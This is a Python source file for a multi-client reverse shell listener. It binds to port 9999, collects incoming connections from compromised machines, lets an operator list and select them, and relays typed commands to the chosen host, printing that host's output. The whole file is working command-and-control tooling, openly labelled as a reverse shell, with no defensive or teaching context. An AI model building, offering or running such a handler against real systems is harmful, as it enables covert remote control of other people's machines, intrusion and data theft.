import sys,socket,threading

class ReverseShell:
    def __init__(self,host:str = '',port:int = 9999):
        try:
            self.allClients = []
            self.__host = host
            self.__port = port
            self.__createSocket()
            while self.__bindSocket():continue
            self.__RLock = threading.RLock()
            thread1 = threading.Thread(target=self.__acceptConnections)
            thread1.daemon = True
            thread1.start()
        except Exception as error:
            print(error)
            print("Exiting server...")
            sys.exit()

    def __createSocket(self):
        try:
            self.__server = socket.socket()
        except socket.error as error:
            print(f'Socket creation error := {error}')
            raise error

    def __bindSocket(self):
        try:
            self.__server.bind((self.__host, self.__port))
            self.__server.listen(5)
            print(f'Listening to port:={self.__port}')
        except socket.error as error:
            print(f'Socket binding error := {error}')
            print(f'Retrying....')
            return True

    def __acceptConnections(self):
        ## Close previous connections
        self.closeAllConnections()
        
        ## Cache all new established connections
        while True:
            try:
                conn,addr = self.__server.accept()
                self.__RLock.acquire()
                self.allClients.append((conn,addr))
                self.__RLock.release()
            except socket.error as error:
                print(f'Connection Error:= := {error}')

    def getClient(self,index: int):
        response = None
        self.__RLock.acquire()
        if index>=0 and index<len(self.allClients):
            conn,addr = self.allClients[index]
            try:
                conn.sendall(str.encode(' '))
                resp = str(conn.recv(4096),'utf-8')
                if resp ==' ':
                    response = self.allClients[index]
                else:
                    conn.close()
                    self.allClients.pop(index)
            except Exception as error:
                conn.close()
                self.allClients.pop(index)
        self.__RLock.release()
        return response

    def closeSocket(self):
        self.__server.close()
        sys.exit()
        
    def closeAllConnections(self):
        self.__RLock.acquire()
        for client in self.allClients:
            conn,addr = client
            conn.close()
            del client
        self.__RLock.release()

    def getAllActiveClients(self):
        self.__RLock.acquire()
        l = len(self.allClients)
        self.__RLock.release()
        
        active = []
        for index in range(l):
            client = self.getClient(index)
            if client!=None:
                active.append(client)
        return active

class MyTerminal(ReverseShell):
    def __init__(self):
        ReverseShell.__init__(self)
        print("Starting My-terminal:")
        self.__startTerminal()

    def __displayAllActiveConnections(self):
        activeConnections = self.getAllActiveClients()
        if len(activeConnections):
            print(f'<--------- Active Clients -------->')
            for i in range(len(activeConnections)):
                (conn,addr) = activeConnections[i]
                print(f'  {i}:  IP:={addr[0]}:{addr[1]}  ')
        else:
            print("No active clients found!")

    def __executable(self,client):
            conn,addr = client
            IP = f'{addr[0]}:{addr[1]}'
            while True:
                try:
                    command = input(f'[{IP}]>>')
                    if(command == 'quit'):
                        break
                    command_byte = str.encode(command)
                    conn.sendall(command_byte)
                    client_resp = str(conn.recv(4096),'utf-8')
                    print(f'{client_resp}',end="")
                except Exception as error:
                    print(f'Code Execution Error:={error}')
                    break

    def __startTerminal(self):
        while True:
            try:
                command = input(">>")
                if command == 'list':
                    self.__displayAllActiveConnections()
                elif 'select' in command:
                    option = command[7:]
                    if option.isdigit():
                        client = self.getClient(int(option))
                        if client is not None:
                            self.__executable(client)
                        else:
                            print(f'"{command}" is an invalid command, expected option within the range!')
                    else:
                        print(f'"{command}" is an invalid command, expected numeric option.')
                elif command == 'exit':
                    self.closeAllConnections()
                    self.closeSocket()
                elif len(command) == 0:
                    print("\n")
                else:
                    print(f'"{command}" is an invalid command.')
            except Exception as error:
                print(f'My-terminal Error:={error}\n')

def main():
    MyTerminal()

if __name__ == "__main__":
    main()